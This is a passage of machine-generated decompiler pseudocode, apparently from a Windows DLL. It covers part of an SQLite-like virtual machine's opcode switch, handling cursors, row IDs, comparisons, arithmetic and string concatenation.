        if ( v194[19] )
          goto LABEL_544;
        *(_QWORD *)&v352 = *(_QWORD *)(*(_DWORD *)v194 + 24);
        if ( (_QWORD)v352 )
          goto LABEL_529;
        v365 = sub_10063A35((_DWORD *)&v352 + 3, *(_DWORD *)DWORD2(v352));
        if ( v365 )
          goto LABEL_840;
        if ( HIDWORD(v352) )
        {
          *(_QWORD *)&v352 = 1i64;
        }
        else
        {
          v365 = sub_10063501(*(_DWORD *)DWORD2(v352), &v352);
          if ( (_QWORD)v352 == 0x7FFFFFFFFFFFFFFFi64 )
            *(_BYTE *)(DWORD2(v352) + 19) = 1;
          else
            *(_QWORD *)&v352 = v352 + 1;
        }
        v1 = (int)a1;
        v8 = v361;
        v6 = 0;
LABEL_529:
        v195 = *((_DWORD *)v9 + 3);
        if ( !v195 )
          goto LABEL_537;
        v196 = *(_DWORD *)(v1 + 204);
        if ( v196 )
        {
          while ( 1 )
          {
            *(_DWORD *)&v353[8] = v196;
            if ( !*(_DWORD *)(v196 + 60) )
              break;
            v196 = *(_DWORD *)(v196 + 60);
          }
          v197 = *(_DWORD *)(v196 + 16) + 40 * *((_DWORD *)v9 + 3);
        }
        else
        {
          v197 = v8 + 40 * v195;
        }
        *(_DWORD *)&v353[4] = v197;
        sub_1005A15D(v197);
        if ( **(_QWORD **)&v353[4] == 0x7FFFFFFFFFFFFFFFi64 || *(_BYTE *)(DWORD2(v352) + 19) )
          goto LABEL_839;
        v198 = **(_QWORD **)&v353[4] + 1i64;
        if ( (__int64)v352 < v198 )
          *(_QWORD *)&v352 = v198;
        **(_QWORD **)&v353[4] = v352;
        v6 = 0;
LABEL_537:
        if ( (_QWORD)v352 == 0x7FFFFFFFFFFFFFFFi64 )
        {
          v199 = 0;
        }
        else
        {
          v199 = v352 + 1;
          v6 = (unsigned __int64)(v352 + 1) >> 32;
        }
        sub_10063439(v199, v6);
        v194 = (_BYTE *)DWORD2(v352);
        if ( !*(_BYTE *)(DWORD2(v352) + 19) )
          goto LABEL_557;
LABEL_544:
        LODWORD(v352) = v364[12];
        v200 = v364[13];
        *(_DWORD *)v353 = 0;
        DWORD1(v352) = v200;
        while ( 2 )
        {
          if ( *(_DWORD *)v353 || (_QWORD)v352 != (v352 & 0xFFFFFF) )
          {
            sub_10069AB6((char *)&v352, 8);
            v194 = (_BYTE *)DWORD2(v352);
            if ( *(int *)v353 < 5 )
              *(_QWORD *)&v352 = v352 & 0xFFFFFF;
          }
          else
          {
            *(_QWORD *)&v352 = (unsigned int)v352 + 1i64;
          }
          v201 = sub_10063A72(*(_DWORD *)v194, 0, v352, 0, (int *)&v352 + 3);
          ++*(_DWORD *)v353;
          v365 = v201;
          if ( *(int *)v353 >= 100 )
            goto LABEL_554;
          if ( !v201 )
          {
            if ( !HIDWORD(v352) )
            {
              v194 = (_BYTE *)DWORD2(v352);
              continue;
            }
LABEL_554:
            if ( !v201 && !HIDWORD(v352) )
            {
LABEL_839:
              v365 = 13;
              goto LABEL_841;
            }
          }
          break;
        }
        v194 = (_BYTE *)DWORD2(v352);
LABEL_557:
        v194[17] = 0;
        *(_BYTE *)(DWORD2(v352) + 21) = 0;
        *(_DWORD *)(DWORD2(v352) + 68) = 0;
LABEL_335:
        v23 = v363;
        *v363 = v352;
        v24 = DWORD1(v352);
LABEL_30:
        v23[1] = v24;
        goto LABEL_58;
      case 0x36u:
      case 0x37u:
        v202 = *(_DWORD *)(v1 + 52);
        LODWORD(v352) = v8 + 40 * *((_DWORD *)v9 + 2);
        *(_DWORD *)v353 = *(_DWORD *)(v202 + 4 * *((_DWORD *)v9 + 1));
        if ( *v9 == 54 )
        {
          DWORD1(v352) = v8 + 40 * *((_DWORD *)v9 + 3);
          v203 = *(_DWORD *)DWORD1(v352);
          *((_QWORD *)&v352 + 1) = *(_QWORD *)DWORD1(v352);
        }
        else
        {
          v203 = *((_DWORD *)v9 + 3);
          *((_QWORD *)&v352 + 1) = v203;
        }
        if ( (v9[3] & 1) != 0 )
          ++*(_DWORD *)(v1 + 104);
        if ( (v9[3] & 2) != 0 )
        {
          v7[12] = v203;
          v7[13] = HIDWORD(v352);
        }
        if ( (*(_BYTE *)(v352 + 28) & 1) != 0 )
        {
          *(_DWORD *)(v352 + 20) = 0;
          *(_DWORD *)(v352 + 24) = 0;
        }
        if ( (v9[3] & 0x10) != 0 )
          *(_DWORD *)&v353[8] = *(_DWORD *)(*(_DWORD *)v353 + 64);
        else
          *(_DWORD *)&v353[8] = 0;
        *(_DWORD *)&v353[4] = 0;
        sub_10063439(0, 0);
        v365 = sub_10065921(
                 *(int *)&v353[8],
                 **(_DWORD **)v353,
                 0,
                 *((signed __int64 *)&v352 + 1),
                 *(void **)(v352 + 20),
                 *(_DWORD *)(v352 + 24),
                 *(int *)&v353[4],
                 v9[3] & 8);
        *(_BYTE *)(*(_DWORD *)v353 + 17) = 0;
        *(_BYTE *)(*(_DWORD *)v353 + 21) = 0;
        v94 = v365 == 0;
        *(_DWORD *)(*(_DWORD *)v353 + 68) = 0;
        if ( v94 && v364[46] && *((_DWORD *)v349 + 4) )
        {
          *(_DWORD *)&v353[12] = *(_DWORD *)(16 * *(_DWORD *)(*(_DWORD *)v353 + 4) + v364[2]);
          *(_DWORD *)&v353[16] = *((_DWORD *)v349 + 4);
          *(_DWORD *)&v353[20] = (v349[3] & 4) != 0 ? 23 : 18;
          ((void (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v364[46])(
            v364[45],
            *(_DWORD *)&v353[20],
            *(_DWORD *)&v353[12],
            *(_DWORD *)&v353[16],
            DWORD2(v352),
            HIDWORD(v352));
        }
        goto LABEL_58;
      case 0x38u:
        v204 = *(_DWORD *)(v1 + 52);
        *(_QWORD *)&v352 = 0i64;
        v205 = *(_DWORD *)(v204 + 4 * *((_DWORD *)v9 + 1));
        DWORD2(v352) = v205;
        if ( v7[46] && *((_DWORD *)v9 + 4) )
          *(_QWORD *)&v352 = *(_QWORD *)(v205 + 8);
        v365 = sub_1005BE63(v205);
        if ( v365 )
          goto LABEL_841;
        sub_10063439(0, 0);
        v206 = sub_10065AD2(*(_DWORD *)DWORD2(v352));
        *(_DWORD *)(DWORD2(v352) + 68) = 0;
        v365 = v206;
        if ( !v206 )
        {
          v207 = (void (__cdecl *)(_DWORD, int, _DWORD, int, _DWORD, _DWORD))v364[46];
          if ( v207 )
          {
            v208 = *((_DWORD *)v349 + 4);
            if ( v208 )
              v207(v364[45], 9, *(_DWORD *)(16 * *(_DWORD *)(DWORD2(v352) + 4) + v364[2]), v208, v352, DWORD1(v352));
          }
        }
        if ( (v349[8] & 1) != 0 )
          goto LABEL_583;
        goto LABEL_58;
      case 0x39u:
        v209 = *(_DWORD *)(v1 + 104);
        v7[16] += v209;
        v7[15] = v209;
        *(_DWORD *)(v1 + 104) = 0;
        goto LABEL_58;
      case 0x3Au:
      case 0x3Bu:
        v210 = *(_DWORD *)(v1 + 52);
        v363 = (int *)(v361 + 40 * *((_DWORD *)v9 + 2));
        LODWORD(v352) = *(_DWORD *)(v210 + 4 * *((_DWORD *)v9 + 1));
        DWORD1(v352) = *(_DWORD *)v352;
        v365 = sub_1005BE63(v352);
        if ( v365 )
          goto LABEL_841;
        if ( *(_BYTE *)(v352 + 23) )
        {
          sub_10063501(SDWORD1(v352), v353);
          v211 = (int)v364[18];
          if ( *(int *)&v353[4] > SHIDWORD(v211) )
            goto LABEL_768;
          LODWORD(v211) = *(_DWORD *)v353;
          if ( *(int *)&v353[4] >= SHIDWORD(v211) && *(_DWORD *)v353 > v364[18] )
            goto LABEL_768;
          DWORD2(v352) = *(_DWORD *)v353;
        }
        else
        {
          v213 = DWORD1(v352);
          sub_100634DB(SDWORD1(v352));
          v212 = *(_DWORD *)(v213 + 48);
          v1 = (int)a1;
          DWORD2(v352) = v212;
          if ( v212 > v364[18] )
            goto LABEL_768;
        }
        v137 = v363;
        if ( sub_10059D49(v212, (int)v363, 0) )
          goto LABEL_828;
        v137[6] = DWORD2(v352);
        *((_WORD *)v137 + 14) = v137[7] & 0xFF00 | 0x10;
        if ( *(_BYTE *)(v352 + 23) )
          v214 = sub_100635F1(0, SDWORD1(v352), DWORD2(v352), (char *)v137[5]);
        else
          v214 = sub_10063776(SDWORD1(v352), 0, DWORD2(v352), (char *)v137[5]);
        v365 = v214;
LABEL_331:
        *((_BYTE *)v137 + 31) = 1;
        goto LABEL_58;
      case 0x3Cu:
        v215 = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        LODWORD(v352) = v215;
        if ( *(_BYTE *)(v215 + 20) )
        {
LABEL_40:
          *((_WORD *)v363 + 14) = 1;
          goto LABEL_58;
        }
        if ( *(_BYTE *)(v215 + 21) )
        {
          DWORD2(v352) = *(_DWORD *)(v215 + 24);
          v216 = *(_DWORD *)(v215 + 28);
LABEL_605:
          HIDWORD(v352) = v216;
          goto LABEL_607;
        }
        v217 = *(_DWORD **)(v215 + 56);
        if ( v217 )
        {
          *(_DWORD *)v353 = *v217;
          *(_DWORD *)&v353[4] = **(_DWORD **)v353;
          v218 = (*(int (__cdecl **)(_DWORD, char *))(*(_DWORD *)&v353[4] + 48))(
                   *(_DWORD *)(v215 + 56),
                   (char *)&v352 + 8);
          v326 = *(_DWORD *)(v1 + 92);
          v365 = v218;
          sub_10058EC7((int)v7, v326);
          v219 = *(_DWORD *)v353;
          *(_DWORD *)(v1 + 92) = *(_DWORD *)(*(_DWORD *)v353 + 8);
          *(_DWORD *)(v219 + 8) = 0;
          goto LABEL_607;
        }
        v365 = sub_1005BE63(v215);
        if ( v365 )
          goto LABEL_841;
        if ( *(_BYTE *)(v352 + 17) )
        {
          DWORD2(v352) = *(_DWORD *)(v352 + 8);
          v216 = *(_DWORD *)(v352 + 12);
          goto LABEL_605;
        }
        v365 = sub_10063501(*(_DWORD *)v352, (_DWORD *)&v352 + 2);
LABEL_607:
        v23 = v363;
        *v363 = DWORD2(v352);
        v24 = HIDWORD(v352);
        goto LABEL_30;
      case 0x3Du:
        LODWORD(v352) = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        *(_BYTE *)(v352 + 20) = 1;
        *(_BYTE *)(v352 + 17) = 0;
        if ( !*(_DWORD *)v352 )
          goto LABEL_58;
        sub_100615B9(*(_DWORD *)v352);
        goto LABEL_57;
      case 0x3Eu:
        v220 = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        LODWORD(v352) = v220;
        v221 = *(_DWORD *)v220;
        DWORD1(v352) = *(_DWORD *)v220;
        if ( DWORD1(v352) )
        {
          v222 = sub_10063A35((_DWORD *)&v352 + 2, v221);
          v220 = v352;
          v1 = (int)a1;
          v365 = v222;
        }
        else
        {
          *(_QWORD *)((char *)&v352 + 4) = 0x100000000i64;
        }
        *(_BYTE *)(v220 + 20) = BYTE8(v352);
        *(_BYTE *)(v352 + 21) = 0;
        *(_BYTE *)(v352 + 17) = 0;
        *(_DWORD *)(v352 + 68) = 0;
        v10 = *((_DWORD *)v9 + 2);
        if ( v10 > 0 && DWORD2(v352) )
          goto LABEL_15;
        goto LABEL_58;
      case 0x3Fu:
        ++*(_DWORD *)(v1 + 172);
        goto LABEL_617;
      case 0x40u:
LABEL_617:
        v223 = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        LODWORD(v352) = v223;
        v224 = *(_DWORD *)v223;
        DWORD1(v352) = *(_DWORD *)v223;
        if ( DWORD1(v352) )
        {
          v1 = (int)a1;
          v365 = sub_10063A10(v224, (_DWORD *)&v352 + 2);
          *(_BYTE *)(v352 + 18) = DWORD2(v352) == 0;
          *(_BYTE *)(v352 + 21) = 0;
          *(_DWORD *)(v352 + 68) = 0;
          *(_BYTE *)(v352 + 17) = 0;
          v223 = v352;
        }
        else
        {
          *(_QWORD *)((char *)&v352 + 4) = 0x100000000i64;
        }
        *(_BYTE *)(v223 + 20) = BYTE8(v352);
        v94 = DWORD2(v352) == 0;
        goto LABEL_171;
      case 0x41u:
      case 0x42u:
        if ( v7[54] )
          goto LABEL_845;
        LODWORD(v352) = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        if ( (_DWORD)v352 )
        {
          v225 = *(_DWORD *)v352;
          DWORD1(v352) = *(_DWORD *)v352;
          if ( DWORD1(v352) )
          {
            DWORD2(v352) = 1;
            if ( *v9 == 66 )
              v226 = sub_10063D40(v225, (_DWORD *)&v352 + 2);
            else
              v226 = sub_10063E4D(v225, (_DWORD *)&v352 + 2);
            v365 = v226;
            *(_BYTE *)(v352 + 20) = BYTE8(v352);
            *(_DWORD *)(v352 + 68) = 0;
            if ( !DWORD2(v352) )
            {
              v227 = *((_DWORD *)v9 + 2);
              v228 = v9[3];
              v362 = v227 - 1;
              if ( v228 )
                ++*(_DWORD *)(v1 + 4 * v228 + 164);
            }
            *(_BYTE *)(v352 + 17) = 0;
          }
          else
          {
            *(_BYTE *)(v352 + 20) = 1;
          }
        }
        goto LABEL_58;
      case 0x43u:
        v229 = *(_DWORD **)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        LODWORD(v352) = v229;
        v230 = v8 + 40 * *((_DWORD *)v9 + 2);
        DWORD1(v352) = *v229;
        if ( DWORD1(v352) )
        {
          v231 = *(_DWORD *)(v230 + 24);
          DWORD2(v352) = v231;
          HIDWORD(v352) = *(_DWORD *)(v230 + 20);
          if ( (v9[3] & 0x10) != 0 )
            v6 = v229[16];
          v365 = sub_10065921(v6, SDWORD1(v352), (void *)HIDWORD(v352), v231, &unk_101863F5, 0, 0, *((_DWORD *)v9 + 3));
          *(_DWORD *)(v352 + 68) = 0;
        }
        goto LABEL_58;
      case 0x44u:
      case 0x45u:
        if ( (*(_BYTE *)(v8 + 40 * *((_DWORD *)v9 + 1) + 28) & 1) != 0 )
        {
          v101 = 2;
        }
        else
        {
          LODWORD(v102) = sub_1005A03A(v8 + 40 * *((_DWORD *)v9 + 1));
          v1 = (int)a1;
          v101 = v102 != 0;
        }
        LODWORD(v352) = v101;
        if ( (*(_BYTE *)(v361 + 40 * *((_DWORD *)v9 + 2) + 28) & 1) != 0 )
        {
          DWORD1(v352) = 2;
        }
        else
        {
          LODWORD(v103) = sub_1005A03A(v361 + 40 * *((_DWORD *)v9 + 2));
          v101 = v352;
          v1 = (int)a1;
          DWORD1(v352) = v103 != 0;
        }
        v104 = 3 * v101;
        if ( *v9 == 69 )
          LODWORD(v105) = (unsigned __int8)byte_100FEEB4[v104 + DWORD1(v352)];
        else
          LODWORD(v105) = (unsigned __int8)byte_100FF154[v104 + DWORD1(v352)];
        LODWORD(v352) = v105;
        v84 = v361 + 40 * *((_DWORD *)v9 + 3);
        v363 = (int *)v84;
        if ( (_DWORD)v105 == 2 )
          goto LABEL_169;
        v105 = (int)v105;
        *(_DWORD *)v84 = v105;
        LOWORD(v105) = *(_WORD *)(v84 + 28) & 0xFF04;
        *(_DWORD *)(v84 + 4) = HIDWORD(v105);
        v86 = v105 | 4;
        goto LABEL_157;
      case 0x46u:
        v232 = *(int **)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        LODWORD(v352) = v232;
        v233 = *v232;
        DWORD1(v352) = *v232;
        if ( DWORD1(v352) )
        {
          *(_DWORD *)v353 = v232[10];
          *(_DWORD *)&v353[4] = *((unsigned __int16 *)v9 + 6);
          *(_DWORD *)&v353[16] = v361 + 40 * *((_DWORD *)v9 + 2);
          v365 = sub_10063A72(v233, (int)v353, 0i64, 0, (int *)&v352 + 2);
          if ( !v365 && !DWORD2(v352) )
            v365 = sub_10065AD2(SDWORD1(v352));
          *(_DWORD *)(v352 + 68) = 0;
        }
        goto LABEL_58;
      case 0x47u:
        DWORD1(v352) = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        LODWORD(v352) = *(_DWORD *)DWORD1(v352);
        *((_WORD *)v363 + 14) = 1;
        if ( !(_DWORD)v352 )
          goto LABEL_58;
        v365 = sub_1005BE63(SDWORD1(v352));
        if ( v365 )
          goto LABEL_841;
        if ( *(_BYTE *)(DWORD1(v352) + 20) )
          goto LABEL_58;
        v365 = sub_1005C4E1(v352, (_DWORD *)&v352 + 2);
        if ( v365 )
          goto LABEL_841;
        v234 = v363;
        *(_QWORD *)v363 = *((_QWORD *)&v352 + 1);
        *((_WORD *)v234 + 14) = 4;
        goto LABEL_58;
      case 0x48u:
      case 0x51u:
        v235 = *(int **)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        LODWORD(v352) = v235;
        if ( !*v235 )
          goto LABEL_58;
        DWORD2(v352) = v235[10];
        WORD6(v352) = *((_WORD *)v9 + 8);
        HIWORD(v352) = 8 * (v9[3] != 0) + 4;
        *(_DWORD *)&v353[8] = v361 + 40 * *((_DWORD *)v9 + 3);
        v236 = sub_1005C5B7(v235, (int)&v352 + 8, (int *)&v352 + 1);
        v94 = *v9 == 72;
        v365 = v236;
        if ( v94 )
          DWORD1(v352) = -DWORD1(v352);
        else
          ++DWORD1(v352);
        if ( SDWORD1(v352) > 0 )
          goto LABEL_455;
        goto LABEL_57;
      case 0x49u:
        v94 = (*(_BYTE *)(40 * *((_DWORD *)v9 + 1) + v8 + 28) & 1) == 0;
        goto LABEL_171;
      case 0x4Au:
        v111 = (*(_BYTE *)(40 * *((_DWORD *)v9 + 1) + v8 + 28) & 1) == 0;
        goto LABEL_230;
      case 0x4Bu:
      case 0x4Cu:
      case 0x4Du:
      case 0x4Eu:
      case 0x4Fu:
      case 0x50u:
        v89 = v8 + 40 * *((_DWORD *)v9 + 1);
        v350 = v8 + 40 * *((_DWORD *)v9 + 3);
        v90 = *(unsigned __int16 *)(v350 + 28);
        v348 = v89;
        v91 = *(unsigned __int16 *)(v89 + 28);
        v344 = v90;
        LOBYTE(v90) = v91 | v90;
        v346 = v91;
        v92 = v9[3];
        if ( (v90 & 1) != 0 )
        {
          if ( v92 >= 0 )
          {
            if ( (v92 & 0x10) == 0 )
            {
              v94 = (v92 & 8) == 0;
              goto LABEL_171;
            }
            v84 = v8 + 40 * *((_DWORD *)v9 + 2);
            v363 = (int *)v84;
LABEL_169:
            v86 = *(_WORD *)(v84 + 28) & 0xFF00 | 1;
LABEL_157:
            *(_WORD *)(v84 + 28) = v86;
            goto LABEL_58;
          }
          v93 = ((unsigned __int8)v346 & (unsigned __int8)v344 & 1) == 0;
        }
        else
        {
          BYTE4(v352) = v92 & 0x67;
          if ( (v92 & 0x67) != 0 )
          {
            sub_1005C806(v348, SBYTE4(v352), v351);
            sub_1005C806(v350, SBYTE4(v352), v351);
            if ( *((_BYTE *)v7 + 30) )
              goto LABEL_828;
          }
          v93 = sub_1005A556(v350, *((_DWORD *)v9 + 4), v348);
          v9 = v349;
          v8 = v361;
        }
        LODWORD(v352) = v93;
        switch ( *v9 )
        {
          case 'K':
            v95 = v93 != 0;
            break;
          case 'L':
            v95 = v93 == 0;
            break;
          case 'M':
            v95 = v93 > 0;
            break;
          case 'N':
            v95 = v93 <= 0;
            break;
          case 'O':
            v95 = v93 < 0;
            break;
          default:
            v95 = v93 >= 0;
            break;
        }
        LODWORD(v352) = v95;
        if ( (v9[3] & 0x10) != 0 )
        {
          v96 = v8 + 40 * *((_DWORD *)v9 + 2);
          *(_WORD *)(v96 + 28) = *(_WORD *)(v96 + 28) & 0xFF00 | 4;
          v363 = (int *)v96;
          *(_QWORD *)v96 = (int)v352;
          goto LABEL_58;
        }
        goto LABEL_225;
      case 0x52u:
      case 0x53u:
      case 0x54u:
      case 0x55u:
        v71 = v8 + 40 * *((_DWORD *)v9 + 1);
        v72 = v8 + 40 * *((_DWORD *)v9 + 2);
        v73 = v8 + 40 * *((_DWORD *)v9 + 3);
        v74 = *(_BYTE *)(v71 + 28) | *(_BYTE *)(v72 + 28);
        v348 = v71;
        v363 = (int *)v73;
        if ( (v74 & 1) != 0 )
        {
          sub_1005A1F4(v73);
          goto LABEL_58;
        }
        LODWORD(v75) = sub_1005A03A(v72);
        *(_QWORD *)&v352 = v75;
        LODWORD(v76) = sub_1005A03A(v348);
        *((_QWORD *)&v352 + 1) = v76;
        if ( *v9 == 82 )
        {
          *(_QWORD *)&v352 = v76 & v352;
        }
        else if ( *v9 == 83 )
        {
          *(_QWORD *)&v352 = v76 | v352;
        }
        else
        {
          if ( *v9 == 84 )
            v77 = (_QWORD)v352 << v76;
          else
            v77 = (__int64)v352 >> v76;
          *(_QWORD *)&v352 = v77;
        }
        *(_QWORD *)v73 = v352;
        *(_WORD *)(v73 + 28) = *(_WORD *)(v73 + 28) & 0xFF00 | 4;
        goto LABEL_57;
      case 0x56u:
      case 0x57u:
      case 0x58u:
      case 0x59u:
      case 0x5Au:
        v348 = v361 + 40 * *((_DWORD *)v9 + 1);
        sub_1005C78F(v348);
        v53 = v361 + 40 * *((_DWORD *)v9 + 2);
        sub_1005C78F(v53);
        v54 = (int *)(v361 + 40 * *((_DWORD *)v9 + 3));
        v55 = *(unsigned __int16 *)(v348 + 28) | *(unsigned __int16 *)(v53 + 28);
        v363 = v54;
        LODWORD(v352) = v55;
        if ( (v55 & 1) != 0 )
          goto LABEL_118;
        if ( (*(_BYTE *)(v348 + 28) & *(_BYTE *)(v53 + 28) & 4) != 0 )
        {
          v56 = *(_DWORD *)v348;
          *((_QWORD *)&v352 + 1) = *(_QWORD *)v348;
          *(_DWORD *)v353 = *(_DWORD *)v53;
          v57 = *(_DWORD *)(v53 + 4);
          *(_DWORD *)&v353[4] = v57;
          switch ( *v9 )
          {
            case 'V':
              v59 = (__PAIR64__(v57, v56) + __PAIR64__(HIDWORD(v352), *(unsigned int *)v353)) >> 32;
              *(_DWORD *)v353 += v56;
              break;
            case 'W':
              v60 = __PAIR64__(v57, *(unsigned int *)v353) - __PAIR64__(HIDWORD(v352), v56);
              v59 = HIDWORD(v60);
              *(_DWORD *)v353 = v60;
              break;
            case 'X':
              v58 = __PAIR64__(v57, *(unsigned int *)v353) * __PAIR64__(HIDWORD(v352), v56);
              goto LABEL_96;
            case 'Y':
              if ( !(HIDWORD(v352) | v56) )
                goto LABEL_118;
              if ( (HIDWORD(v352) & v56) == -1 && !*(_DWORD *)v353 && v57 == 0x80000000 )
              {
                v56 = 1;
                *((_QWORD *)&v352 + 1) = 1i64;
              }
              v58 = __SPAIR64__(v57, *(unsigned int *)v353) / __SPAIR64__(HIDWORD(v352), v56);
LABEL_96:
              *(_QWORD *)v353 = v58;
              v54 = v363;
LABEL_100:
              *(_QWORD *)v54 = *(_QWORD *)v353;
              *((_WORD *)v54 + 14) = v54[7] & 0xFF00 | 4;
              goto LABEL_58;
            default:
              if ( HIDWORD(v352) | v56 )
              {
                if ( (HIDWORD(v352) & v56) == -1 )
                {
                  v56 = 1;
                  *((_QWORD *)&v352 + 1) = 1i64;
                }
                v58 = __SPAIR64__(v57, *(unsigned int *)v353) % __SPAIR64__(HIDWORD(v352), v56);
                goto LABEL_96;
              }
LABEL_118:
              sub_1005A1F4((int)v54);
              goto LABEL_58;
          }
          *(_DWORD *)&v353[4] = v59;
          goto LABEL_100;
        }
        *(double *)&v353[8] = sub_1005A0AF(v348);
        v61 = sub_1005A0AF(v53);
        *(double *)&v353[16] = v61;
        switch ( *v9 )
        {
          case 'V':
            v62 = v61 + *(double *)&v353[8];
            break;
          case 'W':
            v62 = v61 - *(double *)&v353[8];
            break;
          case 'X':
            v62 = v61 * *(double *)&v353[8];
            break;
          case 'Y':
            if ( 0.0 == *(double *)&v353[8] )
              goto LABEL_117;
            v62 = v61 / *(double *)&v353[8];
            break;
          default:
            *((_QWORD *)&v352 + 1) = (unsigned __int64)*(double *)&v353[8];
            *(_QWORD *)v353 = (unsigned __int64)v61;
            if ( !(unsigned __int64)*(double *)&v353[8] )
              goto LABEL_117;
            if ( (HIDWORD(v352) & DWORD2(v352)) == -1 )
              *((_QWORD *)&v352 + 1) = 1i64;
            v62 = (double)((__int64)(unsigned __int64)v61 % *((_QWORD *)&v352 + 1));
            break;
        }
        *(double *)&v353[16] = v62;
        if ( sub_1005926E() )
        {
LABEL_117:
          v1 = (int)a1;
          v54 = v363;
          goto LABEL_118;
        }
        v63 = v363;
        v64 = *((_WORD *)v363 + 14);
        *((double *)v363 + 1) = *(double *)&v353[16];
        *((_WORD *)v63 + 14) = v64 & 0xFF00 | 8;
        if ( (v352 & 8) == 0 )
          sub_1005A108((int)v63);
        goto LABEL_57;
      case 0x5Bu:
        v47 = v8 + 40 * *((_DWORD *)v9 + 1);
        v48 = v8 + 40 * *((_DWORD *)v9 + 2);
        v49 = v8 + 40 * *((_DWORD *)v9 + 3);
        v50 = *(_BYTE *)(v48 + 28);
        v348 = v47;
        v51 = *(_WORD *)(v47 + 28);
        v350 = v48;
        v363 = (int *)v49;
        if ( (((unsigned __int8)v51 | v50) & 1) != 0 )
          goto LABEL_67;
        if ( (v51 & 0x12) != 0 )
          goto LABEL_71;
        if ( sub_10059E94(v348, (unsigned __int8)v351) )
          goto LABEL_828;
        v48 = v350;
LABEL_71:
        if ( (*(_BYTE *)(v48 + 28) & 0x12) != 0 )
          goto LABEL_74;
        if ( sub_10059E94(v350, (unsigned __int8)v351) )
          goto LABEL_828;
        v48 = v350;
LABEL_74:
        *(_QWORD *)&v352 = *(_DWORD *)(v48 + 24) + *(_DWORD *)(v348 + 24);
        if ( (__int64)v352 > (int)v7[18] )
          goto LABEL_768;
        *(_WORD *)(v49 + 28) = *(_WORD *)(v49 + 28) & 0xFF00 | 2;
        if ( sub_10059D49(v352 + 2, v49, v49 == v350) )
          goto LABEL_828;
        v52 = v350;
        if ( v49 != v350 )
          memcpy(*(void **)(v49 + 20), *(const void **)(v350 + 20), *(_DWORD *)(v350 + 24));
        memcpy(
          (void *)(*(_DWORD *)(v52 + 24) + *(_DWORD *)(v49 + 20)),
          *(const void **)(v348 + 20),
          *(_DWORD *)(v348 + 24));
        *(_BYTE *)(v352 + *(_DWORD *)(v49 + 20)) = 0;
        *(_BYTE *)(v352 + *(_DWORD *)(v49 + 20) + 1) = 0;
        *(_WORD *)(v49 + 28) |= 0x200u;
        *(_DWORD *)(v49 + 24) = v352;
        *(_BYTE *)(v49 + 31) = v351;
        goto LABEL_58;
      case 0x5Cu:
        DWORD1(v352) = 0;
        for ( j = v7[34]; ; j = *(_DWORD *)(j + 8) )
        {
          DWORD2(v352) = j;
          if ( !j )
            break;
          if ( *(_DWORD *)(j + 68) == -1108210269 && *(_BYTE *)(j + 100) < 2u && *(int *)(j + 84) >= 0 )
            ++DWORD1(v352);
        }
        *((_WORD *)v363 + 14) = 1;
        if ( SDWORD1(v352) <= 1 )
        {
          HIDWORD(v352) = *((_DWORD *)v9 + 3);
          v346 = *((_DWORD *)v9 + 1);
          v238 = *(_DWORD *)(16 * HIDWORD(v352) + v364[2] + 4);
          sub_10068C39(v238);
          v346 = sub_10065FF4(v238, v346, (unsigned int *)&v352);
          sub_10068CA7(v238);
          v239 = v363;
          v240 = v346;
          v94 = v346 == 0;
          *((_WORD *)v363 + 14) = 4;
          v365 = v240;
          *(_QWORD *)v239 = (int)v352;
          if ( v94 )
          {
            v241 = v352;
            if ( (_DWORD)v352 )
            {
              v242 = *((_DWORD *)v9 + 1);
              v243 = v364[2] + 16 * HIDWORD(v352);
              for ( k = *(_DWORD **)(*(_DWORD *)(v243 + 12) + 12); k; k = (_DWORD *)*k )
              {
                v245 = k[2];
                if ( *(_DWORD *)(v245 + 24) == v241 )
                  *(_DWORD *)(v245 + 24) = v242;
              }
              for ( m = *(_DWORD **)(*(_DWORD *)(v243 + 12) + 28); m; m = (_DWORD *)*m )
              {
                v247 = m[2];
                if ( *(_DWORD *)(v247 + 20) == v241 )
                  *(_DWORD *)(v247 + 20) = v242;
              }
              v347 = 1;
            }
          }
        }
        else
        {
          v365 = 6;
          *(_BYTE *)(v1 + 56) = 2;
        }
        goto LABEL_58;
      case 0x5Du:
        v109 = v8 + 40 * *((_DWORD *)v9 + 1);
        v49 = v8 + 40 * *((_DWORD *)v9 + 2);
        v94 = (*(_BYTE *)(v109 + 28) & 1) == 0;
        v363 = (int *)v49;
        if ( !v94 )
        {
LABEL_67:
          sub_1005A1F4(v49);
          goto LABEL_58;
        }
        LODWORD(v108) = ~sub_1005A03A(v109);
        HIDWORD(v108) = ~HIDWORD(v108);
LABEL_219:
        sub_1005A280(v49, v108, SHIDWORD(v108));
        goto LABEL_57;
      case 0x5Eu:
        v26 = (_BYTE *)*((_DWORD *)v9 + 4);
        *v9 = 9;
        v27 = sub_10059297(v26);
        v94 = (_BYTE)v351 == 1;
        *((_DWORD *)v9 + 1) = v27;
        if ( v94 )
          goto LABEL_38;
        v365 = sub_1005A3FE(0, (int)v363, -1, v28, 1);
        if ( v365 == 18 )
          goto LABEL_768;
        v29 = v363;
        if ( sub_10059D24((int)v363, (unsigned __int8)v351) )
          goto LABEL_828;
        v29[9] = 0;
        *((_WORD *)v29 + 14) = v29[7] & 0xF3FF | 0x800;
        v7 = v364;
        if ( v9[1] == 0xFF )
          sub_10058EC7((int)v364, *((_DWORD *)v9 + 4));
        v30 = v363;
        v9[1] = -1;
        *((_DWORD *)v9 + 4) = v30[5];
        *((_DWORD *)v9 + 1) = v30[6];
LABEL_38:
        if ( *((_DWORD *)v9 + 1) > v7[18] )
          goto LABEL_768;
LABEL_39:
        v31 = v363;
        *((_WORD *)v363 + 14) = 2562;
        v31[5] = *((_DWORD *)v9 + 4);
        v31[6] = *((_DWORD *)v9 + 1);
        *((_BYTE *)v31 + 31) = v351;
        goto LABEL_58;
